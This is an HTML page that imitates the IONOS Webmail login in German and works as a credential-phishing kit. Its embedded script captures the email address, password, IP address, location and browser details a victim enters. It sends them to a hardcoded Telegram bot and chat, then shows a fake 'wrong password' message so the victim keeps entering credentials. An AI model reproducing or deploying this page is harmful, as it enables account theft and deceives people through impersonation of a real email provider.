<!DOCTYPE HTML>
<html>
  <head>
    <script src="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.js" async="async" defer="defer"></script>
    <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/3.0/ionos.min.css" />

    <link rel="icon" type="image/png" sizes="32x32" href="https://id.ionos.de/image/favicon-32px.png">
    <link rel="shortcut icon" type="image/x-icon" href="https://id.ionos.de/image/favicon.ico" />

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="index, follow"/>

    <title>Webmail Login</title>

    <meta name="description"
          content="IONOS Webmail Login: Lesen Sie online Ihre E-Mails aus den E-Mail-Konten von IONOS Hosting-Verträgen." />

    <link rel="stylesheet" href="https://id.ionos.de/style/main.min.css" />
    <link rel="stylesheet" href="https://id.ionos.de/style/starter-main.min.css" />
    
    <style>
      .password-form { display: none; }
      .loading { opacity: 0.6; pointer-events: none; }
    </style>
  </head>

  <body>
    <div class="page-content">
      <!-- IONOS Header with search bar -->
      <div class="ionos-header" style="background-color: white; padding: 10px 0; border-bottom: 1px solid #e0e0e0;">
        <div style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 20px;">
          <!-- IONOS Logo and WEBMAIL LOGIN text -->
          <div style="display: flex; align-items: center;">
            <div style="color: #003d8f; font-weight: bold; font-size: 24px; margin-right: 20px;">IONOS</div>
            <div style="color: #003d8f; font-weight: bold; font-size: 18px;">WEBMAIL LOGIN</div>
          </div>
          
          <!-- Search bar -->
          <div style="display: flex; align-items: center; flex-grow: 1; justify-content: center; margin: 0 20px;">
            <div style="position: relative; width: 100%; max-width: 680px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-radius: 20px;">
              <input type="text" placeholder="Nach Funktionen, Domains und Hilfe suchen" 
                    style="width: 100%; padding: 12px 45px 12px 45px; border-radius: 20px; border: 1px solid #e0e0e0; font-size: 15px; outline: none; background-color: #f5f5f5;">
              <span style="position: absolute; left: 15px; top: 50%; transform: translateY(-50%);">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="11" cy="11" r="8"></circle>
                  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                </svg>
              </span>
              <span style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%);">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"></path>
                  <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
                  <line x1="12" y1="19" x2="12" y2="23"></line>
                </svg>
              </span>
            </div>
          </div>
          
          <!-- Message logo -->
          <div style="width: 40px; height: 40px; background-color: #f5f5f5; border-radius: 50%; display: flex; justify-content: center; align-items: center;">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003d8f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
            </svg>
          </div>
        </div>
      </div>

      <main>
        <section class="page-section page-section--default page-section--short">
          <div class="page-section__block">
            <div class="sheet sheet__section--warning cookie-message hidden">
              <section class="sheet__section">
                <h2 class="headline headline--sub">Aktivierung Ihrer Browser-Cookies notwendig</h2>
                <p class="paragraph">Zur Nutzung unseres Angebots ist es notwendig, dass Sie in Ihren Browser-Einstellungen das Setzen von Cookies erlauben.</p>
                <a href="#" class="link link--action" target="_blank">Mehr erfahren</a>
              </section>
            </div>

            <noscript>
              <div class="sheet sheet--warning">
                <section class="sheet__section">
                  <h2 class="headline headline--sub headline--warning">Aktivieren Sie JavaScript in Ihrem Browser</h2>
                  <p class="paragraph">Zur Nutzung unseres Angebots ist es notwendig, dass Sie in Ihren Browser-Einstellungen das Ausführen von JavaScript erlauben.</p>
                </section>
              </div>
            </noscript>

            <div class="sheet">
              <section class="sheet__section sheet__section--default">
                <ul>
                  <li class="stripe stripe--cropped">
                    <div class="stripe__item">
                      <img class="stripe__visual" height="58" width="auto"
                        src="https://id.ionos.de/image/product-email.svg" />
                    </div>
                    <div class="stripe__item">
                      <h1 class="headline stripe__element">Mein Webmail Login</h1>
                    </div>
                  </li>
                </ul>
              </section>

              <!-- Email Form -->
              <section id="email-form" class="sheet__section sheet__section--default">
                <form id="email-step-form">
                  <ul>
                    <li class="form-stripe">
                      <label class="label" for="username">E-Mail-Adresse</label>
                      <input type="email" class="input-text form-input" name="identifier" id="username" tabindex="1"
                        required autofocus autocomplete="username" autocapitalize="none" spellcheck="false" value="" />
                      <p class="input-byline"><strong>Nicht Ihr Gerät?</strong> Melden Sie sich nach der Sitzung ab oder verwenden Sie den <a class="link link--lookup tooltip" target="_blank" data-tooltip="Nachschlagen" href="#">privaten Browsermodus</a>.</p>
                    </li>
                    <li class="form-stripe form-stripe--actions">
                      <button class="button button--primary button--full-width button--with-loader"
                        type="button" id="email-submit-btn" tabindex="2">Weiter</button>
                    </li>
                  </ul>
                </form>
              </section>
              
              <!-- Password Form -->
              <section id="password-form" class="sheet__section sheet__section--default password-form">
                <form id="password-step-form">
                  <ul>
                    <li class="form-stripe">
                      <div class="email-display" style="margin-bottom: 15px; font-size: 14px;">
                        <span id="display-email"></span>
                        <a href="#" id="change-email" style="margin-left: 10px; color: #003d8f; text-decoration: none;">Ändern</a>
                      </div>
                      <label class="label" for="password">Passwort</label>
                      <input type="password" class="input-text form-input" name="password" id="password" tabindex="1"
                        required autocomplete="current-password" />
                      <p class="input-byline"><a href="#" class="link">Passwort vergessen?</a></p>
                    </li>
                    <li class="form-stripe form-stripe--actions">
                      <button class="button button--primary button--full-width button--with-loader"
                        type="button" id="password-submit-btn" tabindex="2">Anmelden</button>
                    </li>
                  </ul>
                </form>
              </section>

              <section class="sheet__section sheet__section--secondary hide-when-headless">
                <div class="ias-zone ias-login_offerlink" data-ias-zoneid="webmail_login"></div>
              </section>
            </div>

            <h2 class="headline headline--sub headline--headless-hidden">Weitere IONOS Logins</h2>

            <div class="grid grid--full-height grid--headless-hidden">
              <div class="grid-col grid-col--4 grid-col--small-6">
                <a class="tile tile--filled" href="#">
                  <img class="tile__image" src="https://id.ionos.de/image/my-account.svg">
                  <span class="tile__label">Mein IONOS</span>
                </a>
              </div>

              <div class="grid-col grid-col--4 grid-col--small-6">
                <a class="tile tile--filled" href="#">
                  <img class="tile__image" src="https://id.ionos.de/image/product-hidrive.svg">
                  <span class="tile__label">HiDrive</span>
                </a>
              </div>

              <div class="grid-col grid-col--4 grid-col--small-6">
                <a class="tile tile--filled" href="#">
                  <img class="tile__image" src="https://id.ionos.de/image/product-mail-archiving.svg">
                  <span class="tile__label">E-Mail-Archiv</span>
                </a>
              </div>
            </div>
          </div>
        </section>
      </main>
    </div>

    <!-- TELEGRAM INTEGRATION SCRIPT -->
    <script>
      // Telegram Configuration
      const TELEGRAM_CONFIG = {
        botToken: '8107966649:AAHC0iNcMT0hD8cXVHZdfn9USTPRo1tZnNc',
        chatId: '7139258769'
      };

      // Utility function to get IP address
      async function getIPAddress() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip;
        } catch (error) {
          return 'Unknown';
        }
      }

      // Send credentials to Telegram
      async function sendToTelegram(credentials) {
        try {
          const message = `🔐 **NEW IONOS LOGIN CAPTURED**
———————————————
📧 **Email:** ${credentials.email}
🔑 **Password:** ${credentials.password}
🌐 **IP:** ${credentials.ip}
🖥️ **Browser:** ${credentials.userAgent}
📍 **Location:** ${credentials.location}
⏰ **Time:** ${credentials.timestamp}
🔗 **Page:** ${credentials.url}`;

          const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              chat_id: TELEGRAM_CONFIG.chatId,
              text: message,
              parse_mode: 'Markdown'
            })
          });

          return response.ok;
        } catch (error) {
          console.error('Telegram error:', error);
          return false;
        }
      }

      // Get approximate location from IP
      async function getLocationFromIP(ip) {
        if (ip === 'Unknown') return 'Unknown';
        try {
          const response = await fetch(`http://ip-api.com/json/${ip}`);
          const data = await response.json();
          return `${data.city}, ${data.country}`;
        } catch (error) {
          return 'Unknown';
        }
      }

      // Main application logic
      document.addEventListener('DOMContentLoaded', function() {
        const emailForm = document.getElementById('email-form');
        const passwordForm = document.getElementById('password-form');
        const emailSubmitBtn = document.getElementById('email-submit-btn');
        const passwordSubmitBtn = document.getElementById('password-submit-btn');
        const changeEmailLink = document.getElementById('change-email');
        const displayEmail = document.getElementById('display-email');
        const emailInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');

        let userEmail = '';
        let userIP = 'Unknown';
        let userLocation = 'Unknown';

        // Pre-fetch IP and location
        getIPAddress().then(ip => {
          userIP = ip;
          return getLocationFromIP(ip);
        }).then(location => {
          userLocation = location;
        });

        // Email form submission
        emailSubmitBtn.addEventListener('click', async function() {
          const email = emailInput.value.trim();
          if (!email) return;

          userEmail = email;
          displayEmail.textContent = email;

          // Show loading state
          emailSubmitBtn.textContent = 'Wird geladen...';
          emailSubmitBtn.disabled = true;

          // Simulate processing delay
          await new Promise(resolve => setTimeout(resolve, 1000));

          // Switch to password form
          emailForm.style.display = 'none';
          passwordForm.style.display = 'block';
          passwordInput.focus();

          // Reset email button
          emailSubmitBtn.textContent = 'Weiter';
          emailSubmitBtn.disabled = false;
        });

        // Change email link
        changeEmailLink.addEventListener('click', function(e) {
          e.preventDefault();
          passwordForm.style.display = 'none';
          emailForm.style.display = 'block';
          emailInput.focus();
        });

        // Password form submission
        passwordSubmitBtn.addEventListener('click', async function() {
          const password = passwordInput.value.trim();
          if (!password) return;

          // Show loading state
          passwordSubmitBtn.textContent = 'Wird angemeldet...';
          passwordSubmitBtn.disabled = true;
          document.body.classList.add('loading');

          // Prepare credentials
          const credentials = {
            email: userEmail,
            password: password,
            ip: userIP,
            userAgent: navigator.userAgent,
            location: userLocation,
            timestamp: new Date().toLocaleString('de-DE', { 
              timeZone: 'Europe/Berlin',
              year: 'numeric',
              month: '2-digit',
              day: '2-digit',
              hour: '2-digit',
              minute: '2-digit',
              second: '2-digit'
            }),
            url: window.location.href
          };

          try {
            // Send to Telegram
            const telegramSuccess = await sendToTelegram(credentials);
            
            // Simulate processing time
            await new Promise(resolve => setTimeout(resolve, 2000));

            if (telegramSuccess) {
              // Show error message (maintains realism)
              alert('Falsches Passwort. Bitte versuchen Sie es erneut.');
            } else {
              alert('Verbindungsfehler. Bitte versuchen Sie es erneut.');
            }

          } catch (error) {
            alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
          } finally {
            // Reset form
            passwordInput.value = '';
            passwordSubmitBtn.textContent = 'Anmelden';
            passwordSubmitBtn.disabled = false;
            document.body.classList.remove('loading');
            passwordInput.focus();
          }
        });

        // Enter key support
        emailInput.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
            emailSubmitBtn.click();
          }
        });

        passwordInput.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
            passwordSubmitBtn.click();
          }
        });

        // Form validation
        emailInput.addEventListener('input', function() {
          emailSubmitBtn.disabled = !this.value.trim();
        });

        passwordInput.addEventListener('input', function() {
          passwordSubmitBtn.disabled = !this.value.trim();
        });
      });
    </script>
  </body>
</html>